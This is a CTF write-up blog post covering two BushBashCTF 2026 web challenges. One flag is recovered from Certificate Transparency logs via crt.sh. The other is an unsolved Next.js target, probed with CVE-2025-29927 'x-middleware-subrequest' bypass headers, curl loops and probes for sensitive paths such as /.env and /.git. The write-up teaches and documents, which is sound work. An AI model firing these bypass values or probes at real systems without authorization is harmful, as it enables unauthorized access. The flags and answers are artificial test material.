---
title: "BushBashCTF 2026 Web Writeup: Certificate Transparency Flag Leak & Next.js Middleware Bypass Recon"
slug: "bushbashctf-2026-web-writeup"
description: "BushBashCTF 2026 web writeup covering both challenges: Secret hidden website (a DNS-less hostname whose flag is exfiltrated through a SubjectAltName in a Certificate Transparency log, decoded via crt.sh with lbrac/rbrac brace stand-ins) and Old website (a Next.js App Router service where CVE-2025-29927 middleware bypass is the intended primitive — a full reconnaissance and attack-surface enumeration of an unresolved medium challenge)."
date: 2026-08-03T09:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BushBashCTF 2026"]
tags:
  - "bushbashctf"
  - "bushbashctf 2026"
  - "ctf writeup"
  - "web"
  - "web exploitation"
  - "certificate transparency"
  - "crt.sh"
  - "ct logs"
  - "subject alternative name"
  - "dns enumeration"
  - "osint"
  - "next.js"
  - "cve-2025-29927"
  - "middleware bypass"
  - "x-middleware-subrequest"
  - "app router"
  - "recon"
  - "attack surface enumeration"
  - "ctf 2026"
keywords:
  - "bushbashctf 2026 web writeup"
  - "secret hidden website ctf writeup"
  - "old website bushbash ctf writeup"
  - "certificate transparency flag ctf"
  - "crt.sh subdomain enumeration ctf"
  - "subjectaltname flag leak ctf"
  - "dns-less hostname certificate transparency"
  - "lbrac rbrac dns label flag encoding"
  - "cve-2025-29927 middleware bypass ctf"
  - "next.js x-middleware-subrequest bypass"
  - "next.js app router prerender cache ctf"
  - "hidden subdomain ct log ctf 2026"
  - "web ctf recon methodology"
  - "cloudflare nxdomain host header bypass"
  - "bushbashctf web challenge"
toc: true
cover:
  image: "/images/articles/bushbashctf-2026-web-writeup.png"
  alt: "BushBashCTF 2026 web writeup — two challenges covering Secret hidden website a DNS-less hostname that returns NXDOMAIN on every resolver whose flag is leaked through a Certificate Transparency log where a second SubjectAltName in the issued TLS certificate encodes bushbash lbrac h0w-d1d-y0u-f1nd-th1s rbrac as DNS labels decoded through crt.sh with lbrac meaning open brace and rbrac meaning close brace; and Old website a Next.js App Router service serving a single prerendered database-offline page where CVE-2025-29927 x-middleware-subrequest middleware bypass is the intended primitive documented through a full fingerprint attack-surface enumeration Host and SNI sweep and manifest analysis of an unresolved medium challenge"
---

**BushBashCTF 2026**'s web track paired two medium challenges that never let you touch the application layer the "normal" way — the answer to both lives *outside* the HTTP response body. **Secret hidden website** (202 pts, 100 solves) advertises a real HTTPS URL that has no DNS record at all; the flag is exfiltrated through the one public side effect of requesting a TLS certificate — a **Certificate Transparency** log entry — where a second `SubjectAltName` spells the flag out in DNS labels. **Old website** (247 pts, 74 solves) is a Next.js App Router service that serves a single prerendered "database offline" page and points squarely at **CVE-2025-29927** (the `x-middleware-subrequest` middleware bypass); this half of the writeup is an honest, reproducible reconnaissance deep-dive of a challenge I did *not* land inside the CTF window, documenting the fingerprint, why every obvious attack fails, and exactly what remains to try.

Challenge files, solver, and the full recon transcript are at [Abdelkad3r/BushBashCTF-2026](https://github.com/Abdelkad3r/BushBashCTF-2026/tree/master/web). Companion writeups for the same event: [Cryptography](/ctf-writeups/bushbashctf-2026-crypto-writeup/), [Binary Exploitation](/ctf-writeups/bushbashctf-2026-pwn-writeup/), and [Misc & OSINT](/ctf-writeups/bushbashctf-2026-misc-osint-writeup/).

## Challenges at a glance

| Field | Secret hidden website | Old website |
|---|---|---|
| Category | Web | Web |
| Points | 202 | 247 |
| Solves | 100 | 74 |
| Difficulty | Medium | Medium |
| Core technique | Certificate Transparency SAN leak | Next.js CVE-2025-29927 (recon only) |
| Primitive | `crt.sh` CT log query | `x-middleware-subrequest` bypass |
| Status | **Solved** — `bushbash{h0w-d1d-y0u-f1nd-th1s}` | **Unresolved** — recon documented |

---

## Challenge 1 — Secret hidden website (Medium, 202 pts, 100 solves)

> We have discovered one of our cybervillain's secret websites located at
> `https://secret-hidden-website.bushbash.cssa.club` but we don't seem to be
> able to access it. Can you work out the next step?

The prompt hands you a full `https://` URL and then tells you it can't be
accessed — the whole challenge is figuring out *why* it's unreachable and
what that unreachability is hiding.

### Step 1 — Try the URL directly

```console
$ curl -v --max-time 10 https://secret-hidden-website.bushbash.cssa.club/
* Could not resolve host: secret-hidden-website.bushbash.cssa.club
* Closing connection
```

curl never gets to open a socket. This is not a `403`, not a TLS error, not
a timeout — name resolution itself fails. The hostname does not map to an IP.

### Step 2 — Ask an authoritative resolver

Before assuming a local DNS quirk, confirm the answer against a public
recursive resolver and look at *what* is answering:

```console
$ dig +noshort A secret-hidden-website.bushbash.cssa.club @1.1.1.1
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 28945
;; AUTHORITY SECTION:
cssa.club.  1800  IN  SOA  adi.ns.cloudflare.com. dns.cloudflare.com. ...
```

Two facts fall out of this:

* **`NXDOMAIN`** — the authoritative server for `cssa.club` positively
  asserts this name does not exist. Every record type (`A`, `AAAA`,
  `CNAME`, `TXT`, `MX`, `NS`, `SRV`) comes back empty for this exact label.
* The zone is served by **Cloudflare's** authoritative nameservers
  (`adi.ns.cloudflare.com`). That matters for step 3.

The site name literally does not exist in DNS. So the "website" was never
meant to be browsed.

### Step 3 — Rule out a Host-header trick

A natural next thought: maybe the name resolves nowhere but the origin still
answers if we force the connection and send the right `Host`/SNI. The parent
zone `bushbash.cssa.club` *does* resolve, through Cloudflare's edge
(`188.114.96.1` / `188.114.97.1`), so we point curl at the edge and lie
about the hostname:

```console
$ curl -sk --max-time 10 --resolve \
    secret-hidden-website.bushbash.cssa.club:443:188.114.96.1 \
    https://secret-hidden-website.bushbash.cssa.club/
403 Forbidden  (Cloudflare)
```

Cloudflare's edge rejects SNIs that don't belong to an active tenant config,
so we can't reach any origin this way. TCP/HTTP is a dead end by design —
the challenge phrase *"work out the next step"* has to mean something other
than talking to the server.

### Step 4 — The insight: a cert had to be issued

Here's the pivot. The challenge gives us an `https://` URL. For *any* client
to have ever established a valid TLS session to that exact name, a
publicly-trusted CA (Let's Encrypt or similar) had to issue a certificate
covering it — which means the domain owner had to prove control of the name.
And **every** certificate issued by a publicly-trusted CA is broadcast to the
**Certificate Transparency (CT)** log system. A DNS-less name reachable only
through a real HTTPS URL is the classic CT giveaway: the name may not resolve,
but the *act of requesting a cert for it* is a permanent public record.

### Step 5 — Query Certificate Transparency via crt.sh

[crt.sh](https://crt.sh) is a searchable front end over the CT logs. Query
the parent zone and keep any certificate whose SAN set covers our target
name:

```console
$ curl -s "https://crt.sh/?q=cssa.club&output=json" \
    | jq '.[] | select(.name_value | contains("secret-hidden-website"))'
{
  "issuer_name": "C=US, O=Let's Encrypt, CN=YE1",
  "common_name": "secret-hidden-website.bushbash.cssa.club",
  "name_value": "bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac.bushbash.cssa.club\nsecret-hidden-website.bushbash.cssa.club",
  "not_before": "2026-08-01T03:00:20",
  "not_after":  "2026-10-30T03:00:19",
  "entry_timestamp": "2026-08-01T03:58:51.171"
}
```

The `name_value` field is the newline-joined SAN list, and it contains **two**
names:

1. `secret-hidden-website.bushbash.cssa.club` — the advertised name.
2. `bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac.bushbash.cssa.club` — the
   flag, hiding in plain sight.

Neither name resolves. The second was never meant to be reached over HTTP —
it exists in the certificate for the sole purpose of appearing in the CT log
the instant the cert is issued.

### Step 6 — Decode the SAN

DNS labels are restricted to `[A-Za-z0-9-]`, so you can't literally put `{`
or `}` in a hostname. The author spells the braces out with stand-in labels:

| Label(s) | Meaning |
|---|---|
| `bushbash` | flag prefix |
| `lbrac` | opening brace `{` |
| `h0w-d1d-y0u-f1nd-th1s` | flag body |
| `rbrac` | closing brace `}` |
| `bushbash.cssa.club` | scaffolding — makes the whole string a legal DNS name in the challenge zone |

Substituting the brace stand-ins:

```
bushbash . lbrac . h0w-d1d-y0u-f1nd-th1s . rbrac  →  bushbash{h0w-d1d-y0u-f1nd-th1s}
```

### Automated solver

The full solver pulls every CT entry for `cssa.club`, keeps the certs that
also cover the target name, and pattern-matches the sibling SAN:

```python
#!/usr/bin/env python3
import json, re
from urllib.request import Request, urlopen

TARGET = "secret-hidden-website.bushbash.cssa.club"
CRT_URL = "https://crt.sh/?q=cssa.club&output=json"

def fetch_ct():
    req = Request(CRT_URL, headers={"User-Agent": "bushbash-solve/1.0"})
    with urlopen(req, timeout=30) as r:
        return json.load(r)

def sibling_sans(entries):
    hits = set()
    for e in entries:
        names = set(filter(None, (n.strip() for n in e.get("name_value", "").split("\n"))))
        names.add(e.get("common_name", ""))
        if TARGET in names:
            hits |= names
    hits.discard(TARGET)
    return hits

def decode_flag(name):
    m = re.match(r"^bushbash\.lbrac\.(?P<body>.+?)\.rbrac\.", name)
    return "bushbash{" + m.group("body") + "}" if m else None

entries = fetch_ct()
print(f"[*] crt.sh returned {len(entries)} entries for cssa.club")
for name in sorted(sibling_sans(entries)):
    flag = decode_flag(name)
    if flag:
        print(f"[+] SAN with flag payload: {name}")
        print(f"[+] flag                 : {flag}")
        break
```

```text
[*] crt.sh returned 832 entries for cssa.club
[+] SAN with flag payload: bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac.bushbash.cssa.club
[+] flag                 : bushbash{h0w-d1d-y0u-f1nd-th1s}
```

### Why the "obvious" alternatives don't help

* **Force curl to Cloudflare's edge IP** → `403 Forbidden`; no active tenant
  matches the SNI.
* **Guess Worker routes / `_dnslink` / `_cf.*`** → all empty (RFC 8482 ANY
  refusal).
* **Wildcard `*.cssa.club` cert** → exists, but a wildcard never reveals the
  specific label; you need the *per-name* issuance.
* **`AXFR` zone transfer from Cloudflare** → refused to anonymous clients.

CT log lookup is the only vector that returns useful data without
authenticated access to the zone.

### Flag

```text
bushbash{h0w-d1d-y0u-f1nd-th1s}
```

---

## Challenge 2 — Old website (Medium, 247 pts, 74 solves)

> We found this website running using one of cybervillain Zoowee
> Blubberworth's old domain names. He's supposed to be in jail right now so
> there's really no reason why this server could be up and running. It
> probably hasn't been updated in a year or so. Can you hack in and have a
> peek around?
>
> The website is at `http://34.40.133.67:8080`

**Status: unresolved.** I did not capture this flag during the CTF window.
What follows is the reconnaissance and reasoning I completed — the fingerprint,
the working hypothesis (CVE-2025-29927), and precisely why every attack I
tried returned nothing. It is included because the recon methodology is the
transferable value here, and because the wall I hit is instructive: the
intended primitive was clear, but the *target route it guards* was never
enumerable from any vector I had. Every command below is reproducible from
[`solve.sh`](https://github.com/Abdelkad3r/BushBashCTF-2026/blob/master/web/old-website/solve.sh).

### Step 1 — Fingerprint the stack

```console
$ curl -si --max-time 10 http://34.40.133.67:8080/ | head -20
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
```

The response headers give us a lot:

* **Next.js App Router** (`app/`) serving a single **prerendered** page at
  `/`, `x-nextjs-cache: HIT` on every request.
* A Pages Router coexists but ships only `_app` and `_error`
  (`_buildManifest.js` → `sortedPages: ["/_app", "/_error"]`).
* Build ID: `nLUkWzLoBFZT61KFqWxQ0`.
* Origin is GCP: reverse DNS of `34.40.133.67` is
  `67.133.40.34.bc.googleusercontent.com`.
* Port `443` is a Kubernetes ingress with an *"Acme Co / Kubernetes Ingress
  Controller Fake Certificate"* — unknown SNIs get the default backend's
  404 (`content-length: 83`).

The page body is always the same 3,851 bytes, prerendered, never revalidated:

```html
<main>
  <h1>Zoowee Blubberworth's epic website</h1>
  <p>No content loaded - database offline</p>
</main>
```

### Step 2 — Read the prompt as a version oracle

The prompt is doing more than flavor: *"probably hasn't been updated in a
year or so."* The CTF window is **August 2026**. Next.js disclosed a major
middleware-authorization bypass — **[CVE-2025-29927](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)** —
on **21 March 2025**, patched only in `13.5.9 / 14.2.25 / 15.2.3`. "A year
or so" ago lines up exactly with an unpatched, pre-fix Next.js. The
intended primitive is almost certainly this CVE.

**How CVE-2025-29927 works:** Next.js uses an internal header,
`x-middleware-subrequest`, to prevent middleware from recursing infinitely
on its own subrequests. On vulnerable versions, sending that header with the
right value makes the framework *skip middleware execution entirely* — any
authorization, redirect, or rewrite implemented in `middleware.ts` is
bypassed, and the request is served as if no middleware existed.

### Step 3 — Enumerate the attack surface

Every path below returned either the same cached "database offline" page or a
stock Next.js 404 (~6 KB), regardless of `Host`, `Cookie`, `Cache-Control`,
`Content-Type`, method (except `OPTIONS`/`HEAD`), or the bypass header:

* **Paths:** `/admin`, `/api`, `/api/(admin|flag|health|db|hello|user)`,
  `/robots.txt`, `/sitemap.xml`, `/.env`, `/package.json`, `/flag`,
  `/flag.txt`, `/.git/*`, `/next.config.*`, `/middleware.*`, `/wp-admin`,
  `/cms`, `/dashboard`, `/(auth)/login`, `/(public)/home`, `/index.rsc`, and
  many more.
* **Manifests:** `/_next/BUILD_ID`, `/_next/server/*-manifest.json`,
  `/_next/data/<buildid>/*.json`, `/_next/prerender/*` — nothing app-specific.
* **Server Actions:** `POST /` with a `Next-Action` header and a bogus action
  id → same cached HTML, no error, no side effect.
* **`/_next/image` SSRF:** rejected — `"url" parameter is not allowed`, so no
  remote-pattern allowlist to abuse.

### Step 4 — Fire CVE-2025-29927 at every candidate

I tried every documented bypass value against `/` and ~50 candidate paths:

```text
x-middleware-subrequest: middleware
x-middleware-subrequest: src/middleware
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
x-middleware-subrequest: pages/_middleware
x-middleware-subrequest: app/middleware
```

```console
$ BYPASS="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
$ for p in /admin /api/admin /api/flag /panel /internal /private \
           /zoowee /blubberworth /db-online /db-offline; do
    printf '%-16s ' "$p"
    curl -s --max-time 5 -H "$BYPASS" -o /dev/null \
         -w '%{http_code} %{size_download}b\n' "http://34.40.133.67:8080$p"
  done
```

The result never changed. The reason is structural: `/` is prerendered and
cached with `Vary: RSC, Next-Router-*, Accept-Encoding`. The cache key is
URL plus a couple of Next-Router headers — **nothing an attacker controls**.
The bypass header can skip the middleware, but the CDN cache still serves the
same prerendered body for every URL that actually exists, and every guarded
path I could name genuinely 404s.

### Step 5 — Host and SNI enumeration

The "old domain name" framing strongly implies a `Host`-conditioned route —
middleware that rewrites everything to the "database offline" stub *unless*
the request carries Zoowee's old hostname. So I swept hostnames both as
`Host:` on `:8080` and as `--resolve` SNI targets on `:443`:

```console
$ for h in zooweeblubberworth.com zoowee.com zoowee.local zoowee-old \
           old.bushbash.cssa.club old-website.bushbash.cssa.club; do
    printf '%-45s ' "$h"
    curl -s --max-time 5 -H "Host: $h" -o /dev/null \
         -w 'code=%{http_code} size=%{size_download}\n' \
         "http://34.40.133.67:8080/"
  done
```

I also pulled every `*.cssa.club` SAN from CT (`baserow`, `bushbash`,
`chals.disorientation`, `data.wiki`, `db`, `dev.members`, `disorientation`,
`galette`, `guide`, `jukebox`, `library`, `map.mc`, `members`, `old.members`,
`old.wiki`, `outline`, `play.ctf`, `quotevote`, `sendy`, `storage`,
`timetable`, `todo`, `vault`, `website-test`, `wiki-test`, `wiki`, …) and
tried each. On `:8080` the `Host:` header never changed the cached response;
on `:443` the k8s ingress returned the default-backend 404 for every SNI.

### The working hypothesis

The most plausible intended solve is CVE-2025-29927 against a route the
middleware guards with a `Host` (or query-param) check:

```js
// middleware.ts (hypothetical)
export function middleware(req) {
  const host = req.headers.get('host');
  if (host !== "zoowee-old-domain") {
    return NextResponse.rewrite(new URL('/db-offline', req.url));
  }
}
```

* Without the bypass, every request is rewritten to the prerendered
  `/db-offline` stub — exactly what `/` shows.
* With the bypass **and** the correct target path, `/some-real-page` is
  served directly, the rewrite is skipped, and the DB-backed content (with
  the flag) renders.

The whole challenge then reduces to *guessing the real path* the middleware
redirects away from — and that path was not discoverable from any recon
vector above.

### What remains to try

* **Passive DNS / SecurityTrails / Shodan** on `34.40.133.67` for any
  historical hostname that resolved there.
* **CT SAN lists outside `cssa.club`** that mention "zoowee" / "blubberworth".
* **Large-wordlist `ffuf`** of the bypass header against SecLists
  `raft-large-directories` and Next.js API wordlists.
* **Query-parameter fuzzing** on `/` — the middleware may key on
  `?host=` / `?domain=` rather than the `Host` header.
* **Alternative CVEs** — Next.js cache-poisoning (CVE-2024-46982) as a
  fallback to CVE-2025-29927.

---

## Cross-cutting notes

**The flag is never in the response body.** Both challenges refuse to reveal
anything through the application's HTTP responses — Secret hidden website has
no application at all, and Old website returns one immutable cached page.
When the front door is genuinely empty, pivot to the *artifacts a service
leaves behind*: TLS certificates, CT logs, DNS metadata, framework version
fingerprints. The interesting data lives at the edges of the deployment, not
in the page.

**Certificate Transparency turns any TLS cert into public OSINT.** The moment
a publicly-trusted CA issues a certificate, every SAN in it is a permanent
public record via CT. There is no "secret" DNS name once someone has
requested a certificate for it. `crt.sh` is the fastest first stop for any
web/OSINT CTF involving hidden hostnames, staging subdomains, or "internal"
endpoints — and, as here, for data an author has deliberately smuggled into a
SAN.

**Encoding data in DNS labels is a classic exfiltration idiom.** Labels are
limited to `[A-Za-z0-9-]`, so literal `{`/`}` are impossible — the
`lbrac`/`rbrac` stand-in scheme is a compact reminder of that constraint and
a pattern you'll see reused in DNS-based exfiltration and covert channels.

**Read the prompt as a version oracle.** Old website's "*hasn't been updated
in a year or so*" is a deliberate pointer to a specific disclosure window.
When a CTF prompt volunteers an age, map it against the CVE calendar for the
fingerprinted stack — here, an unpatched Next.js and CVE-2025-29927.

**Framework caches can neutralize a real vulnerability.** CVE-2025-29927 is a
genuine, high-impact bypass, but Old website's prerender cache means skipping
the middleware doesn't change the cached body for any URL that exists. A
correct primitive against the wrong (or missing) target route yields nothing —
a useful reminder that a working exploit still needs a reachable objective.

---

## Frequently Asked Questions

**Q: How can a website have a valid HTTPS URL but no DNS record?**

DNS resolution and TLS certificate issuance are independent. A domain owner
can request a certificate for a hostname (proving control via an ACME
challenge on the parent zone or a temporary record) without ever publishing a
permanent `A`/`AAAA` record. The certificate is valid and public, but the
name resolves to nothing — exactly the Secret hidden website setup. The cert
exists purely to appear in the Certificate Transparency logs.

**Q: What is Certificate Transparency and why does it leak the flag?**

Certificate Transparency (CT) is a public, append-only logging system that
every publicly-trusted Certificate Authority must submit issued certificates
to. Its purpose is to let domain owners detect misissued certs. A side effect
is that every `SubjectAltName` in every issued certificate becomes public the
instant the cert is logged. In this challenge the author put a second SAN,
`bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac.bushbash.cssa.club`, into the
cert — so the flag is published to CT even though the name never resolves.

**Q: Why `lbrac` and `rbrac` instead of the actual braces?**

DNS labels may only contain `[A-Za-z0-9-]`. The characters `{` and `}` are
not legal in a hostname label, so the author spells them out: `lbrac` = left
brace `{`, `rbrac` = right brace `}`. Substituting them into
`bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac` yields
`bushbash{h0w-d1d-y0u-f1nd-th1s}`.

**Q: How do I search Certificate Transparency logs?**

The quickest way is [crt.sh](https://crt.sh): browse to
`https://crt.sh/?q=example.com` in a browser, or add `&output=json` for a
scriptable feed. Query the *parent* zone (`cssa.club`) rather than the exact
hidden name — the hidden name may be a SAN sibling on a cert whose common name
is something else. Other CT front ends include Censys, Google's CT search, and
the `certspotter` API.

**Q: Why does forcing curl to Cloudflare's edge return 403 instead of the site?**

Cloudflare's edge only serves origins for hostnames present in an active
tenant's configuration. When you set an SNI/`Host` for a name Cloudflare
doesn't recognize as a configured hostname, the edge refuses with
`403 Forbidden` before reaching any origin. That's why the Host-header /
`--resolve` trick can't bypass the missing DNS record here.

**Q: What is CVE-2025-29927?**

It's a Next.js authorization bypass disclosed on 21 March 2025. Next.js uses
an internal `x-middleware-subrequest` header to avoid infinite middleware
recursion. On unpatched versions (before `13.5.9 / 14.2.25 / 15.2.3`),
sending that header with a crafted value causes the framework to skip
middleware execution entirely — bypassing any authentication, redirect, or
rewrite implemented in `middleware.ts`. It's the presumed intended primitive
for Old website.

**Q: If CVE-2025-29927 is the primitive, why wasn't Old website solved here?**

The bypass skips the middleware, but Old website serves a single prerendered
page cached by URL plus Next-Router headers — nothing an attacker controls.
Skipping the middleware doesn't change the cached body for any URL that
exists, and every guarded path I could enumerate genuinely returns 404. The
missing piece is the specific route (or old hostname) the middleware guards,
which was not discoverable from fingerprinting, path/manifest enumeration, or
the Host/SNI sweep. The recon is documented so the final step can be
continued.

**Q: What is the flag for Secret hidden website?**

`bushbash{h0w-d1d-y0u-f1nd-th1s}`.

**Q: Where are the solver and recon scripts?**

In the repo: [`web/secret-hidden-website/solve.py`](https://github.com/Abdelkad3r/BushBashCTF-2026/blob/master/web/secret-hidden-website/solve.py)
for the CT log solver and
[`web/old-website/solve.sh`](https://github.com/Abdelkad3r/BushBashCTF-2026/blob/master/web/old-website/solve.sh)
for the full Old website recon transcript.

```json
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "How can a website have a valid HTTPS URL but no DNS record?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "DNS resolution and TLS certificate issuance are independent. A domain owner can request a certificate for a hostname (proving control via an ACME challenge on the parent zone) without publishing a permanent A/AAAA record. The certificate is valid and public via Certificate Transparency, but the name resolves to nothing. In Secret hidden website the cert exists purely to appear in the CT logs, where a second SubjectAltName encodes the flag."
      }
    },
    {
      "@type": "Question",
      "name": "What is Certificate Transparency and why does it leak the flag?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Certificate Transparency is a public append-only logging system that every publicly-trusted CA must submit issued certificates to. A side effect is that every SubjectAltName in every issued certificate becomes public the instant the cert is logged. The author placed a second SAN, bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac.bushbash.cssa.club, into the certificate, so the flag is published to CT even though the name never resolves in DNS."
      }
    },
    {
      "@type": "Question",
      "name": "Why does the flag use lbrac and rbrac instead of braces?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "DNS labels may only contain the characters A-Z, a-z, 0-9, and hyphen. The characters { and } are not legal in a hostname label, so the author spells them out: lbrac means left brace and rbrac means right brace. Substituting them into bushbash.lbrac.h0w-d1d-y0u-f1nd-th1s.rbrac yields bushbash{h0w-d1d-y0u-f1nd-th1s}."
      }
    },
    {
      "@type": "Question",
      "name": "How do I search Certificate Transparency logs for a hidden subdomain?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Use crt.sh: visit https://crt.sh/?q=example.com, or append &output=json for a scriptable feed. Query the parent zone rather than the exact hidden name, because the hidden name is often a SAN sibling on a certificate whose common name is something else. Censys, Google's CT search, and the certspotter API are alternative front ends."
      }
    },
    {
      "@type": "Question",
      "name": "Why does forcing curl to Cloudflare's edge return 403 instead of the site?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Cloudflare's edge only serves origins for hostnames present in an active tenant configuration. When you set an SNI or Host header for a name Cloudflare does not recognize, the edge refuses with 403 Forbidden before reaching any origin. That is why the Host-header and --resolve trick cannot bypass the missing DNS record for Secret hidden website."
      }
    },
    {
      "@type": "Question",
      "name": "What is CVE-2025-29927 in Next.js?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "CVE-2025-29927 is a Next.js authorization bypass disclosed on 21 March 2025. Next.js uses an internal x-middleware-subrequest header to avoid infinite middleware recursion. On versions before 13.5.9, 14.2.25, and 15.2.3, sending that header with a crafted value makes the framework skip middleware execution entirely, bypassing any authentication, redirect, or rewrite implemented in middleware.ts. It is the presumed intended primitive for the Old website challenge."
      }
    },
    {
      "@type": "Question",
      "name": "Why was the Old website challenge not solved despite identifying CVE-2025-29927?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The bypass skips the middleware, but Old website serves a single prerendered page cached by URL plus Next-Router headers, none of which an attacker controls. Skipping the middleware does not change the cached body for any URL that exists, and every guarded path enumerated genuinely returns 404. The missing piece is the specific route or old hostname the middleware guards, which was not discoverable from fingerprinting, path and manifest enumeration, or the Host and SNI sweep."
      }
    },
    {
      "@type": "Question",
      "name": "What is the flag for Secret hidden website?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "bushbash{h0w-d1d-y0u-f1nd-th1s}"
      }
    }
  ]
}
```
